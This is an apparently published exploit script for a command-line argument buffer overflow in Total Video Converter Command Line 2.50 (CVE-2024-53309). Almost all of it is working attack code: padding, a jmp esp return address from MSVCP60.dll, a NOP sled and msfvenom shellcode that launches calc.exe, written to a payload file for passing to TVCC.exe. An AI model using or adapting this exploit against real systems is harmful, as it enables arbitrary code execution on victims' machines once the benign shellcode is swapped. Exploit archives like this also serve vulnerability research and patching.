# Exploit Title: Total Video Converter Command Line 2.50 - Command Line Argument Buffer Overflow (1)
# Date: 2024-10-31
# Vendor Homepage: https://www.effectmatrix.com
# Software Link: https://www.effectmatrix.com/total-video-converter-command-line/tvcc.exe
# Version: 2.50
# Tested on: Windows XP SP3 (x86) No DEP
# CVE: CVE-2024-53309

import sys
import os
import subprocess
import struct

file_name = 'exploit.txt'

print(f"[*] Writing Corrupted Data to {file_name}...")

# Bad Characters: \x00\x07\x09\x0b\x0d\x20\x22

# msfvenom -p windows/exec CMD=calc.exe -b '\x00\x07\x09\x0b\x0d\x20\x22' -v shellcode -f python EXITFUNC=thread
# Payload size: 220 bytes

shellcode =  b""
shellcode += b"\xba\x1e\xd0\xb0\x93\xd9\xcc\xd9\x74\x24\xf4"
shellcode += b"\x58\x29\xc9\xb1\x31\x31\x50\x13\x03\x50\x13"
shellcode += b"\x83\xc0\x1a\x32\x45\x6f\xca\x30\xa6\x90\x0a"
shellcode += b"\x55\x2e\x75\x3b\x55\x54\xfd\x6b\x65\x1e\x53"
shellcode += b"\x87\x0e\x72\x40\x1c\x62\x5b\x67\x95\xc9\xbd"
shellcode += b"\x46\x26\x61\xfd\xc9\xa4\x78\xd2\x29\x95\xb2"
shellcode += b"\x27\x2b\xd2\xaf\xca\x79\x8b\xa4\x79\x6e\xb8"
shellcode += b"\xf1\x41\x05\xf2\x14\xc2\xfa\x42\x16\xe3\xac"
shellcode += b"\xd9\x41\x23\x4e\x0e\xfa\x6a\x48\x53\xc7\x25"
shellcode += b"\xe3\xa7\xb3\xb7\x25\xf6\x3c\x1b\x08\x37\xcf"
shellcode += b"\x65\x4c\xff\x30\x10\xa4\xfc\xcd\x23\x73\x7f"
shellcode += b"\x0a\xa1\x60\x27\xd9\x11\x4d\xd6\x0e\xc7\x06"
shellcode += b"\xd4\xfb\x83\x41\xf8\xfa\x40\xfa\x04\x76\x67"
shellcode += b"\x2d\x8d\xcc\x4c\xe9\xd6\x97\xed\xa8\xb2\x76"
shellcode += b"\x11\xaa\x1d\x26\xb7\xa0\xb3\x33\xca\xea\xd9"
shellcode += b"\xc2\x58\x91\xaf\xc5\x62\x9a\x9f\xad\x53\x11"
shellcode += b"\x70\xa9\x6b\xf0\x35\x55\x8e\xd1\x43\xfe\x17"
shellcode += b"\xb0\xee\x63\xa8\x6e\x2c\x9a\x2b\x9b\xcc\x59"
shellcode += b"\x33\xee\xc9\x26\xf3\x02\xa3\x37\x96\x24\x10"
shellcode += b"\x37\xb3\x46\xf7\xab\x5f\xa7\x92\x4b\xc5\xb7"

# Address=780E9D6E 0x780e9d6e : jmp esp |  {PAGE_EXECUTE_READ} [MSVCP60.dll] ASLR: False, Rebase: False, SafeSEH: False, CFG: False, OS: False, v6.00.8972.0 (C:\BFF\TVCC\MSVCP60.dll), 0x0

payload = b"A" * 548
payload += b"\x6e\x9d\x0e\x78" # jmp esp
payload += b"\x90" * 20
payload += shellcode
payload += b"D" * (4060 - len(shellcode))

try:
    with open(file_name, 'wb') as f:
        f.write(b'-f ' + payload)
except FileNotFoundError as e:
    print(f"[-] Error writing to file: {e}")
    sys.exit(1)

current_directory = os.path.abspath(os.getcwd())
file_path = os.path.join(current_directory, file_name)

print(f"[+] Written Exploit to {file_path}")
print('Copy the payload from the text file and run "TVCC.exe <payload>"')